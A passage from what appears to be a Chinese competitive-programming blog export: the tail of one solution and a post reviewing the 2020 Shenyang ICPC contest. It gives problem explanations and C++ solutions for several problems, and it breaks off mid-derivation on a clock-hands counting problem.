class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],pre[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line">    <span class="keyword">int</span> sum=m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,a+i);</span><br><span class="line">        sum+=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        pre[i]=pre[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> now=<span class="number">0</span>;</span><br><span class="line">    stack&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,m);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(m&lt;a[i])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=<span class="built_in">min</span>(n,i+k-len);j++)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(m&gt;=a[j])&#123;</span><br><span class="line">                    <span class="keyword">while</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">                        <span class="keyword">auto</span> top=s.<span class="built_in">top</span>();</span><br><span class="line">                        <span class="keyword">if</span>(m+pre[j]-pre[top.second]&gt;=a[top.second])&#123;</span><br><span class="line">                            s.<span class="built_in">pop</span>();</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        m+=pre[j]-pre[i<span class="number">-1</span>];</span><br><span class="line">                        len=j-i+<span class="number">1</span>;</span><br><span class="line">                        i=j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    s.<span class="built_in">push</span>(&#123;a[j],j&#125;);</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            m+=a[i];</span><br><span class="line">            len=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(m!=sum)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 杭电杯 </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020沈阳icpc复盘</title>
      <link href="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/"/>
      <url>/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<p>和sigma姐姐vp这场icpc。</p><span id="more"></span><h2 id="D-Journey-to-Un’Goro"><a href="#D-Journey-to-Un’Goro" class="headerlink" title="D. Journey to Un’Goro"></a>D. Journey to Un’Goro</h2><p>这题是构造题，本来有思路了的，但是没敢提交。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/1.png" alt="1"></p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>就是说给定一个长度，你需要构造一个只有 <code>r</code> 和 <code>b</code> 字符的字符串，在字符串的子串中，如果有奇数个<code>r</code>，这就是个好区间。问你一个这样长度的字符串最多有多少个好区间，并构造出最好的情况，按字典序输出，如果超过100个则输出前100个。</p><p>我们思考一下如何去计算最大值，就得先看看怎么去计数，首先暴力计数需要 $n^2$ 就肯定不行。因为是奇数个，所以我们考虑转化成前缀和。那么我们看看，如果只有一个 <code>r</code> 其它全是 <code>b</code> 我们看哪些区间符合条件。这里我们不妨把 <code>r</code> 当成 1，把 <code>b</code> 当成 0。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b b b b r r r b b b</span><br><span class="line">0 0 0 0 1 2 3 3 3 3</span><br></pre></td></tr></table></figure><p>可以很容易发现，当前缀和相减之后为奇数时，区间是好区间。那么就是偶数匹配奇数其实，因为偶数减奇数或者奇数减偶数才有可能得到奇数，而前缀和要么是偶数要么是奇数。我们最终得到的结果就是 $num=cnt_{odd}\times cnt_{even}$ 而我们很容易得到 $cnt_{odd}+cnt_{even}=n$ ，根据基本不等式我们不难得到当 $cnt_{odd}$ 与 $cnt_{even}$ 接近的时候 $num$ 得到最大值。</p><p>因为 $n$ 可能是奇数，所以我这里说的是接近。那么奇数就是一个多一个一个少一个，偶数就是都一样就好了。</p><p>那么这个可以直接算出来的。</p><p>$ans=\frac{n}{2}\times \frac{n+1}{2}$  </p><p>那么主要就是怎么构造了，也很简单，既然要字典序，我们就尽量构造 <code>b</code> 实在不行就构造 <code>r</code>。什么叫实在不行呢？那就是前缀和奇数个数超过了 <code>(n+1)/2</code> 这个时候就肯定不行。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//    clock_t start, end;</span></span><br><span class="line"><span class="comment">//    start = clock();</span></span><br><span class="line"><span class="comment">//    end = clock();</span></span><br><span class="line"><span class="comment">//    cout &lt;&lt; (double) (end - start) / CLOCKS_PER_SEC &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//ios::sync_with_stdio(false);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, x, y) for(int i=(x);i&lt;=(y);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dep(i, x, y) for(int i=(x);i&gt;=(y);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> gcd(a, b) __gcd(a,b)</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn]; </span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> p[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> n1,<span class="keyword">int</span> n2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n1&gt;cnt||n2 &gt; cnt)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">100</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(pos==n+<span class="number">1</span>)&#123;</span><br><span class="line">        flag++;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cout&lt;&lt;s[i];</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        s[pos]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        p[pos]=p[pos<span class="number">-1</span>];</span><br><span class="line">        p[pos] == <span class="number">1</span> ? res=<span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1 + <span class="number">1</span>, n2) : res=<span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1, n2 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(res==<span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        s[pos]=<span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">        p[pos<span class="number">-1</span>]==<span class="number">1</span>?p[pos]=<span class="number">2</span>:p[pos]=<span class="number">1</span>;</span><br><span class="line">        p[pos] == <span class="number">1</span> ? res = <span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1 + <span class="number">1</span>, n2) : res = <span class="built_in">dfs</span>(pos + <span class="number">1</span>, n1, n2 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(res)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    p[<span class="number">0</span>]=<span class="number">2</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> z=<span class="built_in">ceil</span>((<span class="keyword">double</span>)(n+<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">    cout&lt;&lt;z*((n+<span class="number">1</span>)/<span class="number">2</span>)&lt;&lt;endl;</span><br><span class="line">    cnt= z;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Kobolds-and-Catacombs"><a href="#F-Kobolds-and-Catacombs" class="headerlink" title="F. Kobolds and Catacombs"></a>F. Kobolds and Catacombs</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/2.png" alt="2"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是要把一个序列划分，要尽可能地多划分，被划分的序列在一个内部进行排序，最后要求整个序列不递减。那么我们一开始是很容易想到如果元素 $p_i$ 原本需要在 $j$ 的位置上，那么 $i-j$ 的位置上都应该被划分为一个集合。虽然想到了这点，但是其实还可以用这样一种方式做：前缀和！和排过序的前缀和做比较，当有一个位置前缀和相同则 +1，最后输出答案即可，这个思维一定要想到，是sigma姐姐想出来的，我根本没想到qwq。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">//int new_index;</span></span><br><span class="line">&#125;a[maxn]; </span><br><span class="line"><span class="keyword">int</span> vis[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(A a,A b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.value&lt;b.value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn]; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i].value);</span><br><span class="line">        a[i].index=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+a[i].value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum2[i]=sum2[i<span class="number">-1</span>]+a[i].value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum1[i]==sum2[i])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="G-The-Witchwood"><a href="#G-The-Witchwood" class="headerlink" title="G. The Witchwood"></a>G. The Witchwood</h1><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/3.png" alt="3"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>签到，也没啥好说的，就是加出前k大的数。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, t, res = inf;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1050</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    <span class="built_in">sort</span>(a + <span class="number">1</span>, a + n + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= n - k + <span class="number">1</span>; i--)</span><br><span class="line">        sum += a[i];</span><br><span class="line">    cout &lt;&lt; sum;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="K-Scholomance-Academy"><a href="#K-Scholomance-Academy" class="headerlink" title="K.Scholomance Academy"></a>K.Scholomance Academy</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/4.png" alt="4"></p><p>题目描述比较长，也不截全了。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题是题是题面巨长，但是答案巨简单的一题，讲的是一个机器学习的问题。我们只需要设置 <code>θ</code> 的值扫过去，然后积分算面积即可，没有用到啥算法。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">V</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> op;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">&#125; a[N];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> n, tn, fn, tp, fp;</span><br><span class="line"><span class="keyword">double</span> ans, preX;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(V&amp; a, V&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.v == b.v)</span><br><span class="line">        <span class="keyword">return</span> a.op &lt; b.op;</span><br><span class="line">    <span class="keyword">return</span> a.v &lt; b.v;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; a[i].op &gt;&gt; a[i].v;</span><br><span class="line">        <span class="keyword">if</span> (a[i].op == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            fn++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tn++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a + <span class="number">1</span>, a + n + <span class="number">1</span>, cmp);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i].op == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            tp++, fn--;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp++, tn--;</span><br><span class="line">        ans += <span class="number">1.0</span> * tp / (tp + fn) * (<span class="number">1.0</span> * fp / (tn + fp) - preX);</span><br><span class="line">        preX = <span class="number">1.0</span> * fp / (tn + fp);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">10</span>) &lt;&lt; fixed &lt;&lt; ans &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h3><p>题意： 一个时钟，时针走一圈就是一天，现在给定时针走一圈要 $H$ 小时，分针走一圈要 $M$ 分钟，设 $α=\frac{2πA}{HM}$，求一天中时针和分针夹角小于等于 $α$ 的时刻有几次。</p><p>这题首先有如下几个注意点：<br>①分针是按照刻度一格一格走的，因此不能将小数的分钟算入，必须是整的（即不能按照角度来求）。<br>②两者成角度会有两种情况，分针在时针左边成角度 or 在时针右边成角度</p><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/5.png" alt="5"></p><p><strong>切入点：</strong> 一般会最先想到用追及问题的角度去做，但是这样就有两个变量（涉及到分针和时针两个对象），所以我们可以选择将<strong>时针作为参照物</strong> （参照物静止不动），运用相对速度只对分针这一个对象做分析。</p><p>两者绝对速度： $v_{h绝对}= \frac{2π}{HM}$ ，$ v_{m绝对}=\frac{2π}{M}$</p><p>分针相对速度： $v_{m相对}=v_{m绝对}-v_{h绝对}=\frac{2π}{HM}*(H-1)=(H-1)v_{h绝对}$</p><p>即分针相对于时针以 $H−1/min$ 的恒定速度运动。</p><p>要使两者之间夹角小于等于α，也就相当于追及问题中的两针“路程差”≤α，而此处因为时针作为参照物了，所以也就转化成了分针的“路程”$≤α=\frac{2πA}{HM}=A*v_{h绝对}$ </p><p>因此我们可以写出一个关于时间 $t∈[0,HM)$ 的不等式：</p><p>$t\times (H-1)v_{h绝对}\ mod\ HM ≤ |α|=|A∗ v h 绝 对 *v_{h绝对}∗v $</p><p>$t\times (H-1)\ mod\ HM\le |A|$</p><p>根据<strong>剩余系定理三：</strong><br>“若a,b,c为任意3个整数，m为正整数，且（m,c)=1，则当ac≡bc(mod m）时，有a≡b(mod m)”</p><p>所以为了满足互质，可将不等式两边同除以 $g =\gcd(H-1,HM)$  ，不等式可等价为：</p><p>$t\times \frac{H-1}{g}\ mod\ \frac{HM}{g} \le |\frac{A}{g}|$</p><p>$\frac{-A}{g}\le t\times \frac{H-1}{g}\ mod\ \frac{HM}{g}\le \frac{A}{g}$</p><p>————注意：此处t的取值范围也同时从 $[ 0 , HM )$ 缩小到 $[ 0,\frac{HM}{g})$ —————</p><p>下面就只需求解出 t 的整数解的个数，即为满足条件的时刻的次数。我画在数轴上会比较直观。只需求出正半轴有几个整数解，然后个数 $\times 2$并且加上零解。</p><p><img src="/2022/07/25/2020%E6%B2%88%E9%98%B3icpc%E5%A4%8D%E7%9B%98/6.png" alt="6"></p><p>正半轴：因为要mod之后余数$≤\frac{A}{g}$，因此一共有余数为$1，2，3…\frac{A}{g} $ 的共计 $\frac{A}{g}$ 个解，并且这些解中没有重复的，即t的值与余数取值一 一对应，下证：</p><p>令$a=\frac{H-1}{g}$ ，$b=\frac{HM}{g} $</p><p>假设存在$t_1$和$t_2$ 两个不同的值满足：$t_1\times\ mod\ b ≡ t_2\times a\ mod\ b$ 且 $t ∈ [ 0 , b ]$  因此根据同余定义，易证$t_1=t_2$ 与假设矛盾，因此每个t的解所对应的余数一定是各不相同的。</p><p>所以在 $t∈[ 0 , \frac{HM}{g} )$ 的范围内一共有 $2\times (\frac{A}{g})+1$个不同整数解。把范围还原到 $ [ 0 , HM ) $，就共有 $g\times[2\times(\frac{A}g)+1]$ 